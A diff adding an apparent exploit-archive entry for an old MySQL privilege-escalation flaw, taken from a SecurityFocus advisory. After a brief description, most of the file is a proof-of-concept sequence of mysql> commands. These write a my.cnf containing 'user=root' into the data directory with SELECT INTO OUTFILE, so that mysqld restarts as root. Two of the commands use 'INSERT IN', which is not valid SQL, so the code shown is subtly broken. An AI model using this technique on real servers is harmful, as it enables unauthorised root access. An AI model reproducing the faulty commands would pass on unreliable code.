@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/7052/info
+
+A vulnerability has been discovered for MySQL that may allow the mysqld service to start with elevated privileges.
+
+An attacker can exploit this vulnerability by creating a DATADIR/my.cnf that includes the line 'user=root' under the '[mysqld]' option section.
+
+When the mysqld service is executed, it will run as the root user instead of the default user.
+
+This may allow an attacker to obtain elevated privileges on a compromised system.
+
+mysql>CREATE DATABASE roottext;
+mysql>USE roottext;
+mysql>CREATE TABLE hack (conf VARCHAR(80));
+mysql>INSERT IN hack VALUES ('[mysqld]');
+mysql>INSERT IN hack VALUES ('user=root');
+mysql>SELECT * INTO OUTFILE '/path/to/mysql/datadir/my.cnf' FROM hack
+mysql>QUIT
